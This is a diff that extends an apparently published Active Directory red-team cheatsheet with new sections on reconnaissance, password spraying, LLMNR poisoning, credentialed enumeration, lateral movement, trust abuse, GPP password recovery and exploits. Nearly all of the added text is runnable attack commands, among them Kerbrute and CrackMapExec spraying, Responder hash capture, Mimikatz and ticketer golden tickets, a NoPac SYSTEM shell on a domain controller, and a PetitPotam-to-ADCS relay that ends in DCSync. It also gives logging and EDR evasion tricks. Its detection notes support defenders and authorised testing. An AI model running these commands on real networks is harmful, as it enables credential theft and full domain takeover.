@@ -1,13 +1,13 @@
 ---
-title: "Active Directory Vulnerability & Misconfiguration Cheatsheet"
-excerpt: "A reference for AD attack paths — covering ACL abuse, Kerberos attacks, delegation abuse, domain dominance, GPO exploitation, and ADCS misconfigurations. Designed for Red Team engagements."
+title: "Active Directory Enumeration & Attacks Cheatsheet"
+excerpt: "A comprehensive reference for AD enumeration and attack paths — covering external/internal recon, password spraying, network poisoning, credentialed enumeration, ACL abuse, Kerberos attacks, delegation abuse, lateral movement, domain dominance, GPO exploitation, ADCS misconfigurations, cross-forest trust abuse, and advanced exploits. Designed for Red Team engagements."
 url: "https://asbawy.github.io/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet"
 date: "2026-06-15"
-updated: "2026-06-30"
+updated: "2026-07-20"
 category: "Active Directory"
-tags: ["active-directory", "ad", "kerberos", "acl", "delegation", "domain-dominance"]
+tags: ["active-directory", "ad", "kerberos", "acl", "delegation", "domain-dominance", "enumeration", "lateral-movement", "password-spraying", "llmnr", "adcs", "trust-abuse"]
 difficulty: "Advanced"
-readTime: "25 mins"
+readTime: "45 mins"
 ---
 
 # 1. ACL Abuse
@@ -1243,3 +1243,671 @@ Invoke-PetitPotam -Target CA01.domain.local -Listener 10.0.0.100
 | **4887** | CA Audit   | ADCS                         | Certificate issued                    |
 | **5136** | Security   | ACL / RBCD / GPO             | Directory object modified             |
 | **5312** | Security   | GPO abuse                    | Group Policy applied on target        |
+
+---
+
+# 7. External Reconnaissance
+
+Passive intelligence gathering before touching the target network. No direct interaction with the target's infrastructure.
+
+## 7.1 Passive Domain & Infrastructure Discovery
+
+*   **ASN/IP Registrars:** IANA, ARIN, RIPE, BGP Toolkit
+*   **DNS Utilities:** Domaintools, PTRArchive, viewdns.info, ICANN
+*   **Breach Data & Credentials:** HaveIBeenPwned, Dehashed, Greyhat Warfare, Trufflehog
+
+## 7.2 Actionable Commands
+
+<Tabs>
+<Tab label="Google Dorks">
+
+```bash
+# File and Email Discovery
+filetype:pdf inurl:domain.com
+intext:"@domain.com" inurl:domain.com
+```
+
+</Tab>
+<Tab label="DNS">
+
+```bash
+# DNS Enumeration
+nslookup ns1.domain.com
+```
+
+</Tab>
+<Tab label="Breach Data">
+
+```bash
+# Dehashed CLI Query
+sudo python3 dehashed.py -q domain.local -p
+```
+
+</Tab>
+<Tab label="Username Gen">
+
+```bash
+# LinkedIn Username Generation
+linkedin2username
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** Passive recon generates no alerts on the target. Breach data queries may log your IP on
+  third-party platforms.
+</Callout>
+
+---
+
+# 8. Internal Network Recon & Unauthenticated Enumeration
+
+First steps after landing on the internal network — no credentials required.
+
+## 8.1 Host Discovery & Packet Sniffing
+
+<Tabs>
+<Tab label="Linux">
+
+```bash
+# Packet sniffing for ARP, MDNS, LLMNR, NBT-NS broadcasts
+sudo tcpdump -i ens224
+
+# Active Ping Sweep (Quiet output)
+fping -asgq 172.16.5.0/23
+
+# Initial Nmap Scan (Focus on DNS, SMB, LDAP, Kerberos, RPC)
+sudo nmap -v -A -iL hosts.txt -oN host-enum.txt
+```
+
+</Tab>
+</Tabs>
+
+## 8.2 Unauthenticated User Enumeration
+
+<Tabs>
+<Tab label="Kerberos">
+
+```bash
+# Kerberos Pre-Auth User Validation (Fast, stealthy)
+kerbrute userenum -d domain.local --dc <DC_IP> usernames.txt -o valid_ad_users.txt
+```
+
+</Tab>
+<Tab label="SMB NULL Session">
+
+```bash
+# RPC Client
+rpcclient -U "" -N <DC_IP>
+rpcclient $> enumdomusers
+
+# enum4linux
+enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+# CrackMapExec
+crackmapexec smb <DC_IP> --users
+```
+
+</Tab>
+<Tab label="LDAP Anonymous Bind">
+
+```bash
+windapsearch.py --dc-ip <DC_IP> -u "" -U
+ldapsearch -h <DC_IP> -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+```
+
+</Tab>
+</Tabs>
+
+## 8.3 Unauthenticated Password Policy Extraction
+
+<Tabs>
+<Tab label="SMB NULL Session">
+
+```bash
+crackmapexec smb <DC_IP> -u "" -p "" --pass-pol
+enum4linux -P <DC_IP>
+enum4linux-ng -P <DC_IP> -oA output
+rpcclient -U "" -N <DC_IP> -c getdompwinfo
+```
+
+</Tab>
+<Tab label="LDAP Anonymous Bind">
+
+```bash
+ldapsearch -h <DC_IP> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** Kerberos enumeration (Kerbrute) generates Event 4768 but avoids lockout. SMB NULL session
+  attempts generate Event 4625. Check password policy first to avoid lockouts.
+</Callout>
+
+---
+
+# 9. Password Spraying
+
+Try a small set of passwords against many accounts. **Always check the password policy first** to avoid lockouts.
+
+## 9.1 Target List Generation
+
+```bash
+# Bash one-liner for username permutations
+for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done > targets.txt
+```
+
+## 9.2 Execution
+
+<Tabs>
+<Tab label="Linux — RPCClient">
+
+```bash
+for u in $(cat valid_users.txt); do rpcclient -U "$u%Password123!" -c "getusername;quit" <DC_IP> | grep Authority; done
+```
+
+</Tab>
+<Tab label="Linux — Kerbrute">
+
+```bash
+# Avoids Event ID 4625, but watch lockout threshold
+kerbrute passwordspray -d domain.local --dc <DC_IP> valid_users.txt Password123!
+```
+
+</Tab>
+<Tab label="Linux — CrackMapExec">
+
+```bash
+sudo crackmapexec smb <DC_IP> -u valid_users.txt -p Password123! | grep +
+```
+
+</Tab>
+<Tab label="Windows">
+
+```powershell
+Invoke-DomainPasswordSpray -Password Password123! -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+</Tab>
+<Tab label="Local Admin Reuse">
+
+```bash
+# Spray local admin password/hash reuse across the subnet
+crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NT_HASH> | grep +
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** SMB spraying generates Event 4625 per failed attempt. Kerbrute avoids this but still
+  increments the bad password count. Respect the lockout threshold and observation window.
+</Callout>
+
+---
+
+# 10. Network Poisoning (LLMNR / NBT-NS)
+
+Poison name resolution broadcasts to capture NTLMv2 hashes from users authenticating to non-existent hosts.
+
+## 10.1 Responder (Linux)
+
+<Tabs>
+<Tab label="Passive Analysis">
+
+```bash
+# Listen only — no poisoning
+sudo responder -I eth0 -A
+```
+
+</Tab>
+<Tab label="Active Poisoning">
+
+```bash
+sudo responder -I eth0 -w -r -f
+
+# Check captured hashes
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
+```
+
+</Tab>
+</Tabs>
+
+## 10.2 Inveigh (Windows)
+
+<Tabs>
+<Tab label="PowerShell">
+
+```powershell
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+</Tab>
+<Tab label="C# Binary">
+
+```powershell
+.\Inveigh.exe
+# Interactive console commands (press ESC):
+GET NTLMV2UNIQUE
+```
+
+</Tab>
+</Tabs>
+
+## 10.3 Cracking Captured NTLMv2 Hashes
+
+```bash
+hashcat -m 5600 hash.txt wordlist.txt
+```
+
+<Callout type="warning">
+  **OpSec:** Active poisoning is detectable by network monitoring (duplicate responses, suspicious
+  LLMNR/NBT-NS replies). Use passive analysis mode first to assess the environment.
+</Callout>
+
+---
+
+# 11. Credentialed Enumeration
+
+With valid domain credentials — enumerate users, groups, shares, sessions, and graph the full attack surface.
+
+## 11.1 CrackMapExec (CME)
+
+<Tabs>
+<Tab label="Users & Groups">
+
+```bash
+# Enumerate Users & Bad Password Counts
+crackmapexec smb <DC_IP> -u <user> -p <pass> --users
+
+# Enumerate Groups
+crackmapexec smb <DC_IP> -u <user> -p <pass> --groups
+```
+
+</Tab>
+<Tab label="Sessions & Shares">
+
+```bash
+# Enumerate Active Logged-On Users
+crackmapexec smb <Target_IP> -u <user> -p <pass> --loggedon-users
+
+# Enumerate Shares & Permissions
+crackmapexec smb <Target_IP> -u <user> -p <pass> --shares
+
+# Spider Shares for interesting files
+crackmapexec smb <Target_IP> -u <user> -p <pass> -M spider_plus --share 'ShareName'
+```
+
+</Tab>
+</Tabs>
+
+## 11.2 SMBMap
+
+```bash
+# List shares
+smbmap -u <user> -p <pass> -d <domain> -H <Target_IP>
+
+# Recursive directory listing on a specific share
+smbmap -u <user> -p <pass> -d <domain> -H <Target_IP> -R 'ShareName' --dir-only
+```
+
+## 11.3 Windapsearch
+
+```bash
+# Enumerate Domain Admins
+python3 windapsearch.py --dc-ip <DC_IP> -u <domain>\\<user> -p <pass> --da
+
+# Enumerate Privileged Users (Recursive Nested Group Search)
+python3 windapsearch.py --dc-ip <DC_IP> -u <domain>\\<user> -p <pass> -PU
+```
+
+## 11.4 BloodHound Ingestors
+
+<Tabs>
+<Tab label="Linux">
+
+```bash
+bloodhound-python -u '<user>' -p '<pass>' -ns <DC_IP> -d <domain> -c all
+zip -r domain_bh.zip *.json
+```
+
+</Tab>
+<Tab label="Windows">
+
+```powershell
+.\SharpHound.exe -c All --zipfilename OUTPUT
+```
+
+</Tab>
+</Tabs>
+
+## 11.5 Windows Native & PowerView
+
+*Bypass EDR trigger: Use `net1` instead of `net`.*
+
+<Tabs>
+<Tab label="Native Commands">
+
+```powershell
+net1 group /domain
+net1 user /domain <username>
+```
+
+</Tab>
+<Tab label="PowerView">
+
+```powershell
+Get-Domain
+Get-DomainPolicy
+Get-DomainUser -Identity <username> -Properties *
+Get-DomainGroup -Identity "Domain Admins"
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# Search Description fields for passwords
+Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+
+# Enumerate Computers with LAPS enabled
+Find-LAPSDelegatedGroups
+Get-LAPSComputers
+
+# Enumerate GPOs
+Get-DomainGPO | select displayname
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** BloodHound/SharpHound generates thousands of LDAP queries — detectable by MDI and SIEM.
+  Use targeted collection (`-c Session,ACL`) instead of `-c All` when stealth matters.
+</Callout>
+
+---
+
+# 12. Lateral Movement & Remote Access
+
+Moving between hosts after obtaining credentials or hashes.
+
+## 12.1 Remote Connections
+
+<Tabs>
+<Tab label="Linux — Impacket">
+
+```bash
+# PSExec (SYSTEM shell, noisy — writes a service binary)
+psexec.py <domain>/<user>:<pass>@<Target_IP>
+
+# WMIExec (Semi-interactive, stealthier, runs as user)
+wmiexec.py <domain>/<user>:<pass>@<Target_IP>
+
+# SMBExec
+smbexec.py <domain>/<user>:<pass>@<Target_IP>
+```
+
+</Tab>
+<Tab label="Linux — Evil-WinRM">
+
+```bash
+evil-winrm -i <Target_IP> -u <user> -p <pass>
+evil-winrm -i <Target_IP> -u <user> -H <NT_HASH>  # Pass-the-Hash
+```
+
+</Tab>
+<Tab label="Windows — WinRM">
+
+```powershell
+Enter-PSSession -ComputerName <Target_IP> -Credential <domain>\<user>
+```
+
+</Tab>
+</Tabs>
+
+## 12.2 SQL Server Execution
+
+```bash
+# Connect to SQL via Impacket
+mssqlclient.py <domain>/<user>:<pass>@<Target_IP> -windows-auth
+
+# Enable Command Execution in SQL shell
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami /priv
+```
+
+<Callout type="warning">
+  **OpSec:** PSExec creates a service (Event 7045) and writes a binary to `ADMIN$`. WMIExec is
+  stealthier but still generates Event 4688 (process creation). Evil-WinRM uses WinRM (Event 91/168).
+</Callout>
+
+---
+
+# 13. Living Off The Land / Host Recon
+
+Post-compromise host reconnaissance and evasion using built-in tools.
+
+## 13.1 Environment & Network Checks
+
+```cmd
+hostname
+[System.Environment]::OSVersion.Version
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+ipconfig /all
+route print
+arp -a
+netsh advfirewall show allprofiles
+qwinsta   # Shows active logged-in RDP/Console sessions
+```
+
+## 13.2 Evasion Techniques
+
+<Tabs>
+<Tab label="PowerShell Downgrade">
+
+```cmd
+# Downgrade PowerShell to V2 to bypass Script Block Logging
+powershell.exe -version 2
+```
+
+</Tab>
+<Tab label="Defender Status">
+
+```cmd
+Get-MpComputerStatus
+sc query windefend
+```
+
+</Tab>
+</Tabs>
+
+## 13.3 WinRM "Double Hop" Workarounds
+
+<Tabs>
+<Tab label="Method 1 — PSCredential">
+
+```powershell
+$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $SecPassword)
+Get-DomainUser -spn -Credential $Cred
+```
+
+</Tab>
+<Tab label="Method 2 — PSSession Config">
+
+```powershell
+Register-PSSessionConfiguration -Name sessionname -RunAsCredential domain\user
+Restart-Service WinRM
+Enter-PSSession -ComputerName <Target_IP> -Credential domain\user -ConfigurationName sessionname
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** PowerShell V2 downgrade generates Event 400/403 in the PowerShell log. PSSession
+  configuration changes generate Event 91.
+</Callout>
+
+---
+
+# 14. Cross-Forest / Trust Abuse
+
+Enumerating and abusing trust relationships between domains and forests.
+
+## 14.1 Trust Enumeration
+
+<Tabs>
+<Tab label="Windows — PowerView">
+
+```powershell
+Get-DomainTrust
+Get-DomainTrustMapping
+Get-DomainForeignGroupMember -Domain <Trusted_Domain>
+```
+
+</Tab>
+<Tab label="Windows — Netdom">
+
+```powershell
+netdom query /domain:domain.local trust
+```
+
+</Tab>
+</Tabs>
+
+## 14.2 ExtraSids Attack (Child → Parent Domain Compromise)
+
+*Requires full compromise of the child domain (KRBTGT hash).*
+
+<Tabs>
+<Tab label="Linux">
+
+```bash
+# 1. Get Child Domain SID
+lookupsid.py <child_domain>/<admin>@<DC_IP> | grep "Domain SID"
+
+# 2. Get Parent Enterprise Admins SID
+lookupsid.py <child_domain>/<admin>@<DC_IP> | grep -B12 "Enterprise Admins"
+
+# 3. Forge Golden Ticket with ExtraSids
+ticketer.py -nthash <Child_KRBTGT_Hash> -domain <child_domain> -domain-sid <Child_SID> -extra-sid <Parent_EnterpriseAdmins_SID> fakeuser
+
+# 4. Use Ticket
+export KRB5CCNAME=fakeuser.ccache
+psexec.py <parent_domain>/fakeuser@<Parent_DC_IP> -k -no-pass
+
+# Alternative Automated Script
+raiseChild.py -target-exec <Parent_DC_IP> <child_domain>/<admin>
+```
+
+</Tab>
+<Tab label="Windows — Mimikatz">
+
+```powershell
+kerberos::golden /user:fakeuser /domain:<child_domain> /sid:<Child_SID> /krbtgt:<Child_KRBTGT_Hash> /sids:<Parent_EnterpriseAdmins_SID> /ptt
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** ExtraSids tickets contain SID history from another domain — MDI detects this as
+  "Suspicious SID-History addition." The forged ticket also generates abnormal Event 4769 with
+  cross-domain SIDs.
+</Callout>
+
+---
+
+# 15. GPP & SYSVOL Misconfigurations
+
+Group Policy Preferences (GPP) stored passwords in SYSVOL encrypted with a **publicly known AES key** (MS14-025). Legacy environments may still have these artifacts.
+
+<Tabs>
+<Tab label="CrackMapExec">
+
+```bash
+crackmapexec smb <DC_IP> -u <user> -p <pass> -M gpp_password
+crackmapexec smb <DC_IP> -u <user> -p <pass> -M gpp_autologin
+```
+
+</Tab>
+<Tab label="GPP Decrypt">
+
+```bash
+gpp-decrypt <cpassword_string>
+```
+
+</Tab>
+<Tab label="Manual SYSVOL">
+
+```bash
+ls \\<DC_IP>\SYSVOL\<domain>\scripts
+cat \\<DC_IP>\SYSVOL\<domain>\scripts\*.vbs
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** Accessing SYSVOL is normal domain behavior and generates minimal logging. The GPP
+  passwords may be stale — always verify credentials before using them.
+</Callout>
+
+---
+
+# 16. Advanced Exploits
+
+## 16.1 NoPac — SamAccountName Spoofing (CVE-2021-42278 / CVE-2021-42287)
+
+Exploits the lack of validation when renaming a computer account to match a Domain Controller's sAMAccountName. Combined with Kerberos PAC confusion to impersonate a DC.
+
+<Tabs>
+<Tab label="Scan">
+
+```bash
+sudo python3 scanner.py <domain>/<user>:<pass> -dc-ip <DC_IP> -use-ldap
+```
+
+</Tab>
+<Tab label="Exploit">
+
+```bash
+# Get SYSTEM shell on DC
+sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_NAME> -shell --impersonate administrator -use-ldap
+```
+
+</Tab>
+</Tabs>
+
+## 16.2 PetitPotam — NTLM Relay to ADCS (CVE-2021-36942)
+
+Force a DC to authenticate to your relay, then relay to the ADCS web enrollment endpoint to obtain a certificate as the DC machine account.
+
+<Tabs>
+<Tab label="Full Chain">
+
+```bash
+# 1. Setup NTLM Relay targeting ADCS Web Enrollment
+sudo ntlmrelayx.py -debug -smb2support --target http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController
+
+# 2. Trigger Authentication via PetitPotam
+python3 PetitPotam.py <Attacker_IP> <DC_IP>
+
+# 3. Request TGT using captured Base64 Certificate
+python3 gettgtpkinit.py <domain>/<DC_NAME>\$ -pfx-base64 <Base64_Cert_String> dc01.ccache
+
+# 4. Use TGT for DCSync
+export KRB5CCNAME=dc01.ccache
+secretsdump.py -just-dc-user <domain>/administrator -k -no-pass "<DC_NAME>$"@<DC_IP>
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+  **OpSec:** PetitPotam triggers NTLM authentication from the DC (Event 4624 Type 3). The relay
+  generates Event 4886/4887 on the CA. Patched in KB5005413 — but many environments remain
+  vulnerable.
+</Callout>
